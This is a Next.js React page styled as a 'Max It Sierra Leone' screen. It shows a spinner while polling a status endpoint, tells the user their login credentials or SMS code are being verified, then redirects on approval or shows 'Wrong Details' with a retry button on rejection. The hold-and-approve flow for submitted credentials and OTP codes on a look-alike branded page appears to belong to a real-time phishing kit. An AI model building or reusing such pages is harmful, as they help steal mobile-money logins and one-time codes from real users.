'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { Suspense } from 'react';

function ProcessingContent() {
    const router = useRouter();
    const params = useSearchParams();
    const requestId = params.get('id');
    const next = params.get('next') ?? '/dashboard';
    const type = params.get('type') ?? 'login';

    const [status, setStatus] = useState<'pending' | 'approved' | 'rejected'>('pending');
    const [dots, setDots] = useState('.');
    const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

    // Animated dots
    useEffect(() => {
        const d = setInterval(() => setDots((p) => (p.length >= 3 ? '.' : p + '.')), 500);
        return () => clearInterval(d);
    }, []);

    // Poll for status
    useEffect(() => {
        if (!requestId) return;

        const poll = async () => {
            try {
                const res = await fetch(`/api/check-status?requestId=${requestId}`);
                const data = await res.json();
                if (data.status === 'approved' || data.status === 'rejected') {
                    setStatus(data.status);
                    if (intervalRef.current) clearInterval(intervalRef.current);
                }
            } catch {
                // silently retry
            }
        };

        poll(); // immediate first check
        intervalRef.current = setInterval(poll, 2000);
        return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
    }, [requestId]);

    // Auto-redirect on approval
    useEffect(() => {
        if (status === 'approved') {
            const t = setTimeout(() => router.push(next), 1000);
            return () => clearTimeout(t);
        }
    }, [status, router, next]);

    const isRejected = status === 'rejected';
    const isApproved = status === 'approved';

    return (
        <div
            className="min-h-screen flex justify-center items-flex-start"
            style={{ backgroundColor: '#ff7900', fontFamily: 'var(--font-family)' }}
        >
            <div className="w-full max-w-[420px] min-h-screen flex flex-col" style={{ backgroundColor: '#ff7900' }}>

                {/* Header */}
                <header className="flex justify-center items-center h-[60px] px-5" style={{ backgroundColor: '#ff7900' }}>
                    <span className="text-white text-[22px] font-extrabold tracking-tight">
                        Max<span className="text-black">It</span>
                    </span>
                </header>

                {/* White card area */}
                <main
                    className="bg-white flex-grow flex flex-col items-center justify-center px-8 pb-20"
                    style={{
                        borderBottomLeftRadius: '50% 60px',
                        borderBottomRightRadius: '50% 60px',
                    }}
                >
                    {!isRejected ? (
                        <>
                            {/* Spinner / Checkmark */}
                            <div className="mb-8">
                                {isApproved ? (
                                    <div
                                        className="w-20 h-20 rounded-full flex items-center justify-center"
                                        style={{ backgroundColor: '#16a34a', boxShadow: '0 0 0 12px rgba(22,163,74,0.12)' }}
                                    >
                                        <svg width="38" height="38" viewBox="0 0 24 24" fill="none">
                                            <path d="M5 12.5L9.5 17L19 8" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                                        </svg>
                                    </div>
                                ) : (
                                    <div
                                        className="w-20 h-20 rounded-full"
                                        style={{
                                            border: '5px solid rgba(255,121,0,0.15)',
                                            borderTopColor: '#ff7900',
                                            animation: 'spin 1s linear infinite',
                                        }}
                                    />
                                )}
                            </div>

                            <h1 className="text-lg font-bold text-slate-800 mb-2 text-center">
                                {isApproved ? 'Approved!' : 'Processing' + dots}
                            </h1>
                            <p className="text-xs text-slate-400 text-center leading-relaxed">
                                {isApproved
                                    ? 'Redirecting you now...'
                                    : type === 'login'
                                        ? 'Verifying your login credentials.\nPlease wait a moment.'
                                        : 'Verifying your SMS code.\nPlease wait a moment.'}
                            </p>
                        </>
                    ) : (
                        /* Rejected state */
                        <>
                            <div
                                className="w-20 h-20 rounded-full flex items-center justify-center mb-8"
                                style={{ backgroundColor: '#dc2626', boxShadow: '0 0 0 12px rgba(220,38,38,0.12)' }}
                            >
                                <svg width="38" height="38" viewBox="0 0 24 24" fill="none">
                                    <path d="M6 6L18 18M6 18L18 6" stroke="white" strokeWidth="3" strokeLinecap="round" />
                                </svg>
                            </div>

                            <h1 className="text-lg font-bold text-red-600 mb-2 text-center">Wrong Details</h1>
                            <p className="text-xs text-slate-400 text-center leading-relaxed mb-8">
                                The information you provided could not be verified.<br />Please check your details and try again.
                            </p>

                            <button
                                onClick={() => router.back()}
                                className="w-full py-4 rounded-lg text-sm font-bold uppercase tracking-wide border-none cursor-pointer text-white transition-all duration-200"
                                style={{ backgroundColor: '#ff7900', boxShadow: '0 4px 12px rgba(255,121,0,0.3)' }}
                            >
                                TRY AGAIN
                            </button>
                        </>
                    )}
                </main>

                {/* Footer */}
                <footer className="flex justify-center items-center py-8" style={{ backgroundColor: '#ff7900' }}>
                    <p className="text-[10px] font-medium text-white">© 2025 Max It Sierra Leone</p>
                </footer>

            </div>

            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
    );
}

export default function ProcessingPage() {
    return (
        <Suspense fallback={<div style={{ backgroundColor: '#ff7900', minHeight: '100vh' }} />}>
            <ProcessingContent />
        </Suspense>
    );
}
